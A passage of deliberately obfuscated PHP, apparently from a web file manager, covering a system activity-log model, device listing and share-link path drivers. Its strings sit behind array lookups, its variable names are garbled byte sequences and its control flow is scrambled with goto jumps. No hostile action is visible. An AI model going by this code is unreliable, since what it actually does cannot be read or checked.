return parent::remove($cÿöïÙ†±¯[$_SERVER[¯èãÄπµ][363]]); } public function add($C®ª£ÖÜÎÈ) { if ($this->findByName($C®ª£ÖÜÎÈ[$_SERVER[¯èãÄπµ][28]])) { return !1; } return parent::insert($C®ª£ÖÜÎÈ); } public function update($cô≈Ü∑πÁë, $cò≥Îî‚≠ê) { $d•Ôﬁﬁ⁄ˆ¯ =& $_SERVER[¯èãÄπµ]; $Aß¨ß—Üë˜ = $this->findByName($cô≈Ü∑πÁë); $BäŒÂﬁøöŒ = $this->findByName($cò≥Îî‚≠ê[$d•Ôﬁﬁ⁄ˆ¯[28]]); if (!$Aß¨ß—Üë˜ || $BäŒÂﬁøöŒ && $BäŒÂﬁøöŒ[$d•Ôﬁﬁ⁄ˆ¯[363]] != $Aß¨ß—Üë˜[$d•Ôﬁﬁ⁄ˆ¯[363]]) { return !1; } return parent::update($Aß¨ß—Üë˜[$d•Ôﬁﬁ⁄ˆ¯[363]], $cò≥Îî‚≠ê); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\x5f\x6c\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\x6d\145", "\x74\151\155\145", "\x69\x6e\x73\145\162\x74", "\x66\x75\x6e\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $aÚ¶ÉØçÌ‹ =& $_SERVER[¯èãÄπµ]; return array($aÚ¶ÉØçÌ‹[2359] => LNG($aÚ¶ÉØçÌ‹[2360]), $aÚ¶ÉØçÌ‹[2361] => LNG($aÚ¶ÉØçÌ‹[2362]), $aÚ¶ÉØçÌ‹[2027] => LNG($aÚ¶ÉØçÌ‹[2363]), $aÚ¶ÉØçÌ‹[2364] => LNG($aÚ¶ÉØçÌ‹[2365]), $aÚ¶ÉØçÌ‹[2366] => LNG($aÚ¶ÉØçÌ‹[2367]), $aÚ¶ÉØçÌ‹[2368] => LNG($aÚ¶ÉØçÌ‹[2369]), $aÚ¶ÉØçÌ‹[2370] => LNG($aÚ¶ÉØçÌ‹[2371]), $aÚ¶ÉØçÌ‹[2372] => LNG($aÚ¶ÉØçÌ‹[2373]), $aÚ¶ÉØçÌ‹[2058] => LNG($aÚ¶ÉØçÌ‹[2374]), $aÚ¶ÉØçÌ‹[2059] => LNG($aÚ¶ÉØçÌ‹[2375]), $aÚ¶ÉØçÌ‹[2376] => LNG($aÚ¶ÉØçÌ‹[2377]), $aÚ¶ÉØçÌ‹[2378] => LNG($aÚ¶ÉØçÌ‹[2379]), $aÚ¶ÉØçÌ‹[2380] => LNG($aÚ¶ÉØçÌ‹[2381]), $aÚ¶ÉØçÌ‹[2382] => LNG($aÚ¶ÉØçÌ‹[2383]), $aÚ¶ÉØçÌ‹[2056] => LNG($aÚ¶ÉØçÌ‹[2384]), $aÚ¶ÉØçÌ‹[2062] => LNG($aÚ¶ÉØçÌ‹[2385]), $aÚ¶ÉØçÌ‹[2386] => LNG($aÚ¶ÉØçÌ‹[2387]), $aÚ¶ÉØçÌ‹[2388] => LNG($aÚ¶ÉØçÌ‹[2389]), $aÚ¶ÉØçÌ‹[2390] => LNG($aÚ¶ÉØçÌ‹[2391]), $aÚ¶ÉØçÌ‹[2392] => LNG($aÚ¶ÉØçÌ‹[2393]), $aÚ¶ÉØçÌ‹[2065] => LNG($aÚ¶ÉØçÌ‹[2394]), $aÚ¶ÉØçÌ‹[2066] => LNG($aÚ¶ÉØçÌ‹[2395]), $aÚ¶ÉØçÌ‹[2396] => LNG($aÚ¶ÉØçÌ‹[2397]), $aÚ¶ÉØçÌ‹[2398] => LNG($aÚ¶ÉØçÌ‹[2399]), $aÚ¶ÉØçÌ‹[2400] => LNG($aÚ¶ÉØçÌ‹[2401]), $aÚ¶ÉØçÌ‹[2402] => LNG($aÚ¶ÉØçÌ‹[2403]), $aÚ¶ÉØçÌ‹[2404] => LNG($aÚ¶ÉØçÌ‹[2405]), $aÚ¶ÉØçÌ‹[2060] => LNG($aÚ¶ÉØçÌ‹[2406]), $aÚ¶ÉØçÌ‹[2407] => LNG($aÚ¶ÉØçÌ‹[2408]), $aÚ¶ÉØçÌ‹[2409] => LNG($aÚ¶ÉØçÌ‹[2410]), $aÚ¶ÉØçÌ‹[2411] => LNG($aÚ¶ÉØçÌ‹[2411]), $aÚ¶ÉØçÌ‹[2412] => LNG($aÚ¶ÉØçÌ‹[2031]), $aÚ¶ÉØçÌ‹[2413] => LNG($aÚ¶ÉØçÌ‹[2414]), $aÚ¶ÉØçÌ‹[2415] => LNG($aÚ¶ÉØçÌ‹[2416]), $aÚ¶ÉØçÌ‹[2417] => LNG($aÚ¶ÉØçÌ‹[2418]), $aÚ¶ÉØçÌ‹[2419] => LNG($aÚ¶ÉØçÌ‹[2420]), $aÚ¶ÉØçÌ‹[2421] => LNG($aÚ¶ÉØçÌ‹[2422]), $aÚ¶ÉØçÌ‹[2423] => LNG($aÚ¶ÉØçÌ‹[2423]), $aÚ¶ÉØçÌ‹[2424] => LNG($aÚ¶ÉØçÌ‹[2425]), $aÚ¶ÉØçÌ‹[2426] => LNG($aÚ¶ÉØçÌ‹[2427]), $aÚ¶ÉØçÌ‹[2428] => LNG($aÚ¶ÉØçÌ‹[2429]), $aÚ¶ÉØçÌ‹[2430] => LNG($aÚ¶ÉØçÌ‹[2431]), $aÚ¶ÉØçÌ‹[2432] => LNG($aÚ¶ÉØçÌ‹[2433]), $aÚ¶ÉØçÌ‹[2434] => LNG($aÚ¶ÉØçÌ‹[2435])); } private function typeFile() { $fÕÚÈè¶Îì =& $_SERVER[¯èãÄπµ]; $eÛÆ÷‡¯æﬂ = array($fÕÚÈè¶Îì[2062] => array($fÕÚÈè¶Îì[2063]), $fÕÚÈè¶Îì[2380] => array($fÕÚÈè¶Îì[2436]), $fÕÚÈè¶Îì[2382] => array($fÕÚÈè¶Îì[2437]), $fÕÚÈè¶Îì[2056] => array($fÕÚÈè¶Îì[2057]), $fÕÚÈè¶Îì[2388] => array(), $fÕÚÈè¶Îì[2390] => array(), $fÕÚÈè¶Îì[2392] => array(), $fÕÚÈè¶Îì[2065] => array($fÕÚÈè¶Îì[2067]), $fÕÚÈè¶Îì[2066] => array($fÕÚÈè¶Îì[2067]), $fÕÚÈè¶Îì[2396] => array($fÕÚÈè¶Îì[2438]), $fÕÚÈè¶Îì[2398] => array($fÕÚÈè¶Îì[2438]), $fÕÚÈè¶Îì[2400] => array($fÕÚÈè¶Îì[2439]), $fÕÚÈè¶Îì[2386] => array($fÕÚÈè¶Îì[2440]), $fÕÚÈè¶Îì[2402] => array($fÕÚÈè¶Îì[2441]), $fÕÚÈè¶Îì[2404] => array($fÕÚÈè¶Îì[2442]), $fÕÚÈè¶Îì[2060] => array($fÕÚÈè¶Îì[2061])); return $eÛÆ÷‡¯æﬂ; } private function typeAll() { goto F»¥–›π¨ó; d±‘‚ÂôÚà: foreach ($fÛË¿áã‘ as $eÙ›ﬁ«Ì‘ñ => $E›ΩïÕ∂«∞) { $eéåÊÖ–⁄Ê[$E›ΩïÕ∂«∞[0]] = $eéåÊÖ–⁄Ê[$eÙ›ﬁ«Ì‘ñ]; } $eéåÊÖ–⁄Ê[$BóµÆÑ‘óÆ[2067]] = LNG($BóµÆÑ‘óÆ[2443]); $eéåÊÖ–⁄Ê[$BóµÆÑ‘óÆ[2438]] = LNG($BóµÆÑ‘óÆ[2444]); goto eáÌ±≈§ôó; eáÌ±≈§ôó: return $eéåÊÖ–⁄Ê; goto dÏ•ƒ¨ﬁÖ¨; F»¥–›π¨ó: $BóµÆÑ‘óÆ =& $_SERVER[¯èãÄπµ]; $eéåÊÖ–⁄Ê = $this->typeList; $fÛË¿áã‘ = array_filter($this->typeFile()); goto d±‘‚ÂôÚà; dÏ•ƒ¨ﬁÖ¨: } public function addLog($cÍï≠Ë Ö¥, $F≤º±ø¨à = array()) { goto dÑ∑∆πï¬ê; dÑ∑∆πï¬ê: $bÎ¢ ™ﬁç =& $_SERVER[¯èãÄπµ]; if (!isset($this->typeList[$cÍï≠Ë Ö¥])) { return; } $a¶‚¨á◊«Â = USER_ID ? USER_ID : (isset($F≤º±ø¨à[$bÎ¢ ™ﬁç[1424]]) ? $F≤º±ø¨à[$bÎ¢ ™ﬁç[1424]] : 0); goto dıﬁÂ∞çô∫; dıﬁÂ∞çô∫: $CÁ•ØûıÛ± = get_client_ip(); if (!$F≤º±ø¨à || strlen(json_encode($F≤º±ø¨à)) >= 1024) { $F≤º±ø¨à = array($bÎ¢ ™ﬁç[2445] => $CÁ•ØûıÛ±); } else { if (is_array($F≤º±ø¨à)) { $F≤º±ø¨à[$bÎ¢ ™ﬁç[2445]] = $CÁ•ØûıÛ±; } else { $F≤º±ø¨à = array($bÎ¢ ™ﬁç[1036] => $F≤º±ø¨à, $bÎ¢ ™ﬁç[2445] => $CÁ•ØûıÛ±); } } $F≤º±ø¨à = array($bÎ¢ ™ﬁç[1414] => Session::sign(), $bÎ¢ ™ﬁç[1415] => $a¶‚¨á◊«Â, $bÎ¢ ™ﬁç[29] => $cÍï≠Ë Ö¥, $bÎ¢ ™ﬁç[1417] => json_encode($F≤º±ø¨à)); goto e¬√¥‘éÜ‹; e¬√¥‘éÜ‹: parent::add($F≤º±ø¨à); goto C´ëâπÑêõ; C´ëâπÑêõ: } public function remove($E •™Ú”éÆ) { $this->where(array($_SERVER[¯èãÄπµ][381] => $E •™Ú”éÆ))->delete(); } private function _makeOrder($DÕ¬Ûíêëª = '') { goto a·æÁ˜ıÑ≤; a·æÁ˜ıÑ≤: $aä›Æò®Ωé =& $_SERVER[¯èãÄπµ]; $bÇ—“Ì›ãá = $aä›Æò®Ωé[183]; $dÇ≠ãõÛ£ª = array($aä›Æò®Ωé[398] => $aä›Æò®Ωé[399], $aä›Æò®Ωé[400] => $aä›Æò®Ωé[401]); goto cˆºΩ”áç†; cˆºΩ”áç†: $BÉò´ô´◊ä = Input::get($aä›Æò®Ωé[404], $aä›Æò®Ωé[7], $aä›Æò®Ωé[2225], array($aä›Æò®Ωé[2162], $aä›Æò®Ωé[400])); $BÉò´ô´◊ä = $dÇ≠ãõÛ£ª[$BÉò´ô´◊ä]; $DÕ¬Ûíêëª = $DÕ¬Ûíêëª . "{$bÇ—“Ì›ãá}\x20{$BÉò´ô´◊ä}"; goto DÜ‰Ùïœı®; DÜ‰Ùïœı®: return $this->order($DÕ¬Ûíêëª); goto E£Õéª∂—Ô; E£Õéª∂—Ô: } public function get($F‡Ÿ≤÷·Ñç = '') { goto E≈Ñáí£»À; bàˆ–€áÿ´: if (!empty($F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[2445]])) { $BúÍ…ã§ã«[$E©ÈÉ«íâó[401]] = array($E©ÈÉ«íâó[754], "\x25{$F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[2445]]}\45"); } $DÉÆ·¯ﬂ›Ü = $this->_makeOrder()->where($BúÍ…ã§ã«)->selectPage(); if (empty($DÉÆ·¯ﬂ›Ü[$E©ÈÉ«íâó[350]])) { show_json(array(), !0, $DÉÆ·¯ﬂ›Ü[$E©ÈÉ«íâó[347]]); } goto DƒÂ≤ò∆Ùœ; E≈Ñáí£»À: $E©ÈÉ«íâó =& $_SERVER[¯èãÄπµ]; if (!$F‡Ÿ≤÷·Ñç) { show_json(array()); } $BúÍ…ã§ã« = array(); goto e∏ä≠©‘¶≤; e∏ä≠©‘¶≤: if ($F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[1424]]) { $BúÍ…ã§ã«[$E©ÈÉ«íâó[1424]] = $F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[1424]]; } if (isset($F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[705]])) { $a÷¯òç«ø‡ = $F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[705]]; $BœŸŸ≤™Ç¿ = isset($F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[706]]) ? $F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[706]] : time(); $BúÍ…ã§ã«[$E©ÈÉ«íâó[183]] = array($E©ÈÉ«íâó[317], array($a÷¯òç«ø‡, $BœŸŸ≤™Ç¿)); } if ($F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[29]]) { $BÙ®Œ¯ø–÷ = explode($E©ÈÉ«íâó[47], $F‡Ÿ≤÷·Ñç[$E©ÈÉ«íâó[29]]); $dñÀ‘¿ˆÂ≈ = $this->typeFile(); $d‹Ï¶“‡˘® = array(); foreach ($BÙ®Œ¯ø–÷ as $C‘´÷∆ﬂπ) { $d‹Ï¶“‡˘®[] = $C‘´÷∆ﬂπ; if (isset($dñÀ‘¿ˆÂ≈[$C‘´÷∆ﬂπ])) { $d‹Ï¶“‡˘® = array_merge($d‹Ï¶“‡˘®, $dñÀ‘¿ˆÂ≈[$C‘´÷∆ﬂπ]); } } $d‹Ï¶“‡˘® = array_unique($d‹Ï¶“‡˘®); if ($d‹Ï¶“‡˘®) { $BúÍ…ã§ã«[$E©ÈÉ«íâó[29]] = array($E©ÈÉ«íâó[7], $d‹Ï¶“‡˘®); } } goto bàˆ–€áÿ´; DƒÂ≤ò∆Ùœ: $DÉÆ·¯ﬂ›Ü[$E©ÈÉ«íâó[350]] = $this->logList($DÉÆ·¯ﬂ›Ü[$E©ÈÉ«íâó[350]]); return $DÉÆ·¯ﬂ›Ü; goto dÔõËµõî‰; dÔõËµõî‰: } private function ipAddress(&$FÜ«¨É¿Íì) { $d«¢éÈ‡ú‘ =& $_SERVER[¯èãÄπµ]; if (!empty($FÜ«¨É¿Íì[$d«¢éÈ‡ú‘[2445]])) { $c∆–ûÏ≥≠Ë = IpLocation::get($FÜ«¨É¿Íì[$d«¢éÈ‡ú‘[2445]]); if ($c∆–ûÏ≥≠Ë == $d«¢éÈ‡ú‘[2446]) { $c∆–ûÏ≥≠Ë = $d«¢éÈ‡ú‘[2447]; } } else { $c∆–ûÏ≥≠Ë = LNG($d«¢éÈ‡ú‘[2448]); } $FÜ«¨É¿Íì[$d«¢éÈ‡ú‘[2449]] = $c∆–ûÏ≥≠Ë; } private function descZipDownload($bù•Î°˜¥¢, &$FñÓÛöü∑±) { $Aö©†áç≠— =& $_SERVER[¯èãÄπµ]; if (!isset($bù•Î°˜¥¢[$Aö©†áç≠—[2450]])) { return; } $A†åë∆¬æÓ = json_decode($bù•Î°˜¥¢[$Aö©†áç≠—[2450]], !0); foreach ($A†åë∆¬æÓ as $CÓíñ™Ùö≈) { if (!IO::init($CÓíñ™Ùö≈[$Aö©†áç≠—[75]])) { continue; } if (!($dØ“π‚Çû† = IO::infoFull($CÓíñ™Ùö≈[$Aö©†áç≠—[75]]))) { continue; } $bù•Î°˜¥¢[$Aö©†áç≠—[75]] = $CÓíñ™Ùö≈[$Aö©†áç≠—[75]]; $FñÓÛöü∑±[] = $bù•Î°˜¥¢[$Aö©†áç≠—[365]] = $dØ“π‚Çû†[$Aö©†áç≠—[365]]; $FñÓÛöü∑±[] = $bù•Î°˜¥¢[$Aö©†áç≠—[2266]] = $dØ“π‚Çû†[$Aö©†áç≠—[457]]; break; } return $bù•Î°˜¥¢; } private function getSourceList(&$A‘èåöåÜâ) { $A’üÔÖéåÙ =& $_SERVER[¯èãÄπµ]; $A∞ï¬‡∆¡µ = array(); foreach ($A‘èåöåÜâ as $fÖâò¡˘±¿ => $bÎàŒªßæ≥) { goto E∆¢ﬂÀüúà; E∆¢ﬂÀüúà: $e‰ò¢≈©ñ‘ = json_decode($bÎàŒªßæ≥[$A’üÔÖéåÙ[401]], !0); if ($bÎàŒªßæ≥[$A’üÔÖéåÙ[29]] == $A’üÔÖéåÙ[2059]) { $e‰ò¢≈©ñ‘ = $this->descZipDownload($e‰ò¢≈©ñ‘, $A∞ï¬‡∆¡µ); $A‘èåöåÜâ[$fÖâò¡˘±¿][$A’üÔÖéåÙ[401]] = json_encode($e‰ò¢≈©ñ‘); continue; } if (strpos($bÎàŒªßæ≥[$A’üÔÖéåÙ[29]], $A’üÔÖéåÙ[2267]) !== 0) { goto AàÜÑëøÏ§; AàÜÑëøÏ§: if (!isset($e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[75]]) || strpos($bÎàŒªßæ≥[$A’üÔÖéåÙ[29]], $A’üÔÖéåÙ[2451]) !== 0) { continue; } if (!IO::init($e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[75]])) { continue; } if (!($A‰ä¯¡≈∫› = IO::infoFull($e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[75]]))) { continue; } goto a•€ûÌÈ¢¬; a•€ûÌÈ¢¬: $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[365]] = $A‰ä¯¡≈∫›[$A’üÔÖéåÙ[365]]; $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[2266]] = $A‰ä¯¡≈∫›[$A’üÔÖéåÙ[457]]; $A‘èåöåÜâ[$fÖâò¡˘±¿][$A’üÔÖéåÙ[401]] = json_encode($e‰ò¢≈©ñ‘); goto c¨ûﬁ‘Ù´´; c¨ûﬁ‘Ù´´: continue; goto B—µæ≠£âú; B—µæ≠£âú: } goto a¿ÍÛ…‹ÌÚ; a¿ÍÛ…‹ÌÚ: $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[365]]; $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[2266]]; if ($e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[29]] == $A’üÔÖéåÙ[488]) { $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[401]][$A’üÔÖéåÙ[1008]]; $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[401]][$A’üÔÖéåÙ[1009]]; } goto Aõ≠¡÷ñË€; Aõ≠¡÷ñË€: if ($e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[29]] == $A’üÔÖéåÙ[2274]) { $A∞ï¬‡∆¡µ[] = $e‰ò¢≈©ñ‘[$A’üÔÖéåÙ[401]][$A’üÔÖéåÙ[365]]; } goto E—ëíàü¢¶; E—ëíàü¢¶: } if (!$A∞ï¬‡∆¡µ) { return array(); } return Model($A’üÔÖéåÙ[755])->sourceListInfo($A∞ï¬‡∆¡µ, !0); } private function logList($aª≥æ±´ñ) { goto E˜ÇÔ⁄ ”Õ; aâÑæÀãÿª: return $C√˘´åèß◊; goto bÃ†≠õ≈∫‡; b≥Öçéê‡®: $aãà¡‚Ãè = $this->getSourceList($aª≥æ±´ñ); $EîÀ…ãîÊÆ = $this->typeAll(); $C√˘´åèß◊ = array(); goto BªåÔﬂöÙ˘; E˜ÇÔ⁄ ”Õ: $a‚Îéıù¡  =& $_SERVER[¯èãÄπµ]; $bü⁄≥∫õ÷æ = array_to_keyvalue($aª≥æ±´ñ, $a‚Îéıù¡ [33], $a‚Îéıù¡ [1424]); $DΩâ∫ü≈™Ã = Model($a‚Îéıù¡ [473])->userListInfo(array_unique($bü⁄≥∫õ÷æ)); goto b≥Öçéê‡®; BªåÔﬂöÙ˘: $DÙÿ¯˘∏Àı = array(); foreach ($aª≥æ±´ñ as $f†ÖΩóœÔª => $dıóÖ¿ç®‡) { goto Dˆ∫—ó¡˘˘; bä”ÙäŒÇÂ: $dıóÖ¿ç®‡[$a‚Îéıù¡ [28]] = isset($f€ñÿπ»ÌÈ[$a‚Îéıù¡ [28]]) ? $f€ñÿπ»ÌÈ[$a‚Îéıù¡ [28]] : LNG($a‚Îéıù¡ [2448]); $dıóÖ¿ç®‡[$a‚Îéıù¡ [2314]] = isset($f€ñÿπ»ÌÈ[$a‚Îéıù¡ [2314]]) ? $f€ñÿπ»ÌÈ[$a‚Îéıù¡ [2314]] : $a‚Îéıù¡ [33]; $dıóÖ¿ç®‡[$a‚Îéıù¡ [1332]] = isset($EîÀ…ãîÊÆ[$Cø¢∆«¿ºã]) ? $EîÀ…ãîÊÆ[$Cø¢∆«¿ºã] : $fŒì‘ê«¿√; goto f⁄âççûÊ≠; f⁄âççûÊ≠: $dıóÖ¿ç®‡[$a‚Îéıù¡ [2224]] = $f€ñÿπ»ÌÈ; $e«ÀÙóî∑¢ = json_decode($dıóÖ¿ç®‡[$a‚Îéıù¡ [401]], !0); $dıóÖ¿ç®‡[$a‚Îéıù¡ [2445]] = isset($e«ÀÙóî∑¢[$a‚Îéıù¡ [2445]]) ? $e«ÀÙóî∑¢[$a‚Îéıù¡ [2445]] : $a‚Îéıù¡ [33]; goto dÇÒˆøæì£; Dˆ∫—ó¡˘˘: $Cø¢∆«¿ºã = $dıóÖ¿ç®‡[$a‚Îéıù¡ [29]]; $f€ñÿπ»ÌÈ = isset($DΩâ∫ü≈™Ã[$dıóÖ¿ç®‡[$a‚Îéıù¡ [1424]]]) ? $DΩâ∫ü≈™Ã[$dıóÖ¿ç®‡[$a‚Îéıù¡ [1424]]] : !1; $fŒì‘ê«¿√ = strpos($Cø¢∆«¿ºã, $a‚Îéıù¡ [2452]) === 0 ? LNG($a‚Îéıù¡ [2453]) : LNG($a‚Îéıù¡ [2448]); goto bä”ÙäŒÇÂ; Béç⁄ßÈ‰à: unset($dıóÖ¿ç®‡[$a‚Îéıù¡ [2454]]); $C√˘´åèß◊[] = $dıóÖ¿ç®‡; goto fûºÉ÷‚±”; dÇÒˆøæì£: $this->ipAddress($dıóÖ¿ç®‡); if (strpos($Cø¢∆«¿ºã, $a‚Îéıù¡ [2267]) === 0 || isset($e«ÀÙóî∑¢[$a‚Îéıù¡ [2266]])) { goto cÍé“ÿ †è; Fı÷åÁªÂë: if ($e«ÀÙóî∑¢[$a‚Îéıù¡ [29]] == $a‚Îéıù¡ [2274]) { $e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [365]] = $aãà¡‚Ãè[$e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [365]]]; } if ($e«ÀÙóî∑¢[$a‚Îéıù¡ [29]] == $a‚Îéıù¡ [2054]) { $e«ÀÙóî∑¢[$a‚Îéıù¡ [2279]] = $e«ÀÙóî∑¢[$a‚Îéıù¡ [387]]; $e«ÀÙóî∑¢[$a‚Îéıù¡ [2266]] = $e«ÀÙóî∑¢[$a‚Îéıù¡ [2279]][$a‚Îéıù¡ [365]]; $e«ÀÙóî∑¢[$a‚Îéıù¡ [387]] = !1; $e«ÀÙóî∑¢[$a‚Îéıù¡ [365]] = $a‚Îéıù¡ [33]; } if ($e«ÀÙóî∑¢[$a‚Îéıù¡ [387]] && $e«ÀÙóî∑¢[$a‚Îéıù¡ [387]][$a‚Îéıù¡ [367]] == $a‚Îéıù¡ [1082]) { $DÙÿ¯˘∏Àı[] = $dıóÖ¿ç®‡[$a‚Îéıù¡ [363]]; unset($aª≥æ±´ñ[$f†ÖΩóœÔª]); continue; } goto B…ÎØäÀ¬Ü; cÍé“ÿ †è: $e«ÀÙóî∑¢[$a‚Îéıù¡ [387]] = $aãà¡‚Ãè[$e«ÀÙóî∑¢[$a‚Îéıù¡ [365]]]; $e«ÀÙóî∑¢[$a‚Îéıù¡ [2279]] = $aãà¡‚Ãè[$e«ÀÙóî∑¢[$a‚Îéıù¡ [2266]]]; if ($e«ÀÙóî∑¢[$a‚Îéıù¡ [29]] == $a‚Îéıù¡ [488]) { $e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [1008]] = $aãà¡‚Ãè[$e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [1008]]]; $e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [1009]] = $aãà¡‚Ãè[$e«ÀÙóî∑¢[$a‚Îéıù¡ [401]][$a‚Îéıù¡ [1009]]]; } goto Fı÷åÁªÂë; B…ÎØäÀ¬Ü: if ($e«ÀÙóî∑¢[$a‚Îéıù¡ [2279]] && $e«ÀÙóî∑¢[$a‚Îéıù¡ [2279]][$a‚Îéıù¡ [367]] == $a‚Îéıù¡ [1082]) { $DÙÿ¯˘∏Àı[] = $dıóÖ¿ç®‡[$a‚Îéıù¡ [363]]; unset($aª≥æ±´ñ[$f†ÖΩóœÔª]); continue; } goto a©ÜÂ’çŒ…; a©ÜÂ’çŒ…: } $dıóÖ¿ç®‡[$a‚Îéıù¡ [401]] = $e«ÀÙóî∑¢; goto Béç⁄ßÈ‰à; fûºÉ÷‚±”: } $this->clearSystemPathLog($DÙÿ¯˘∏Àı); goto aâÑæÀãÿª; bÃ†≠õ≈∫‡: } private function clearSystemPathLog($E—∫∂´ç⁄‹) { $c£ííﬁÔëÏ =& $_SERVER[¯èãÄπµ]; if (count($E—∫∂´ç⁄‹) == 0) { return; } $E„é—ˆëé = array($c£ííﬁÔëÏ[363] => array($c£ííﬁÔëÏ[7], array_unique($E—∫∂´ç⁄‹))); $this->where($E„é—ˆëé)->delete(); } public function deviceList($eÕ≈ö…πâò, $DÏç≠Ç¡÷ﬂ = 0) { $D◊π·Éà◊î =& $_SERVER[¯èãÄπµ]; $bæÚâ€˜ÇÏ = array($D◊π·Éà◊î[1424] => $eÕ≈ö…πâò, $D◊π·Éà◊î[183] => array($D◊π·Éà◊î[932], $DÏç≠Ç¡÷ﬂ), $D◊π·Éà◊î[29] => $D◊π·Éà◊î[2027]); $CñÖ◊ü»õ‚ = array(); $e∫Ö—ûØºÑ = $this->field($D◊π·Éà◊î[2455])->where($bæÚâ€˜ÇÏ)->order($D◊π·Éà◊î[2277])->limit(50)->select(); foreach ($e∫Ö—ûØºÑ as $aÙπ„ÉÚÔ˜ => $C¬’ú©Ò¶ó) { goto DåØö·áîƒ; DåØö·áîƒ: if ($aÙπ„ÉÚÔ˜ > 0 && abs($C¬’ú©Ò¶ó[$D◊π·Éà◊î[183]] - $e∫Ö—ûØºÑ[$aÙπ„ÉÚÔ˜ - 1][$D◊π·Éà◊î[183]]) < 5) { continue; } $C£Á©°Ñ≥∑ = json_decode($C¬’ú©Ò¶ó[$D◊π·Éà◊î[401]], !0); $C¬’ú©Ò¶ó[$D◊π·Éà◊î[2445]] = isset($C£Á©°Ñ≥∑[$D◊π·Éà◊î[2445]]) ? $C£Á©°Ñ≥∑[$D◊π·Éà◊î[2445]] : $D◊π·Éà◊î[33]; goto C„∫¶®ÜòŸ; C„∫¶®ÜòŸ: unset($C£Á©°Ñ≥∑[$D◊π·Éà◊î[2445]]); $BéÃÆ¶åƒ£ = $this->deviceType($C£Á©°Ñ≥∑[$D◊π·Éà◊î[2268]]); if (isset($CñÖ◊ü»õ‚[$BéÃÆ¶åƒ£])) { continue; } goto FÇèºËö≥˜; FÇèºËö≥˜: $this->ipAddress($C¬’ú©Ò¶ó); $C¬’ú©Ò¶ó[$D◊π·Éà◊î[401]] = $C£Á©°Ñ≥∑; $CñÖ◊ü»õ‚[$BéÃÆ¶åƒ£] = $C¬’ú©Ò¶ó; goto CûˆÔ¯Öæ◊; CûˆÔ¯Öæ◊: } return array_values($CñÖ◊ü»õ‚); } public function deviceType($D©Æ∫‚¿⁄π) { return $D©Æ∫‚¿⁄π; } } goto Aêì÷•´ˆ¢; Bì≈íÜ‘ß¢: class PathDriverDbShareLink extends PathDriverDB { public function __construct($aïàÏœıäâ) { $this->pathParse = $aïàÏœıäâ; $this->model = Model($_SERVER[¯èãÄπµ][1112]); } protected function infoParse($eòéŒµË˘á, $Aù·éÖ§Öû = false, $cÔÙÑ“üáì = false) { $b·¬∆áòíë =& $_SERVER[¯èãÄπµ]; return Action($b·¬∆áòíë[1019])->sharePathInfo($this->pathParse[$b·¬∆áòíë[75]], !0); } public function listPath($e⁄µçﬂôô›, $e¿ºπÖ¶Ñµ = false) { $aÕÊë≥Õ™ò =& $_SERVER[¯èãÄπµ]; $C…úº°€±¶ = parent::listPath($e⁄µçﬂôô›, $e¿ºπÖ¶Ñµ); foreach ($C…úº°€±¶ as $cıÔÈ·Ñ†â => $Aáè±∑§Ù‰) { if (!in_array($cıÔÈ·Ñ†â, array($aÕÊë≥Õ™ò[73], $aÕÊë≥Õ™ò[74]))) { continue; } foreach ($Aáè±∑§Ù‰ as $BúÚ§€Ï„ñ => $b”£∂Íçíê) { $C…úº°€±¶[$cıÔÈ·Ñ†â][$BúÚ§€Ï„ñ] = Action($aÕÊë≥Õ™ò[1019])->shareItemInfo($b”£∂Íçíê); } } return $C…úº°€±¶; } public function listAll($C’¢ñø±∆Ã) { $aâ¨ñ∑ÇÆ‚ =& $_SERVER[¯èãÄπµ]; $F√“êŒÎèØ = IO::info($this->pathParse[$aâ¨ñ∑ÇÆ‚[75]]); if (!$F√“êŒÎèØ) { return array(); } $Dã”ÏòåÇâ = $this->model->listAll($C’¢ñø±∆Ã); foreach ($Dã”ÏòåÇâ as &$dÑ≤€“—°ƒ) { $dÑ≤€“—°ƒ[$aâ¨ñ∑ÇÆ‚[387]] = Action($aâ¨ñ∑ÇÆ‚[1019])->shareItemInfo($dÑ≤€“—°ƒ[$aâ¨ñ∑ÇÆ‚[387]]); } return $Dã”ÏòåÇâ; } } class PathDriverDriverShareItem { public function __construct($côÜ™∫∏∆é) { $this->pathParse = $côÜ™∫∏∆é; } public function __call($A«¶¶Ïπó∞, $Fπöõ•Âıﬂ) { $E¿√ﬁÿ†ÈÚ =& $_SERVER[¯èãÄπµ]; if (method_exists($this, $A«¶¶Ïπó∞)) { return; } $EÀàÉ”Ë∫Ê = call_user_func_array(array($E¿√ﬁÿ†ÈÚ[1119], $A«¶¶Ïπó∞), $Fπöõ•Âıﬂ); 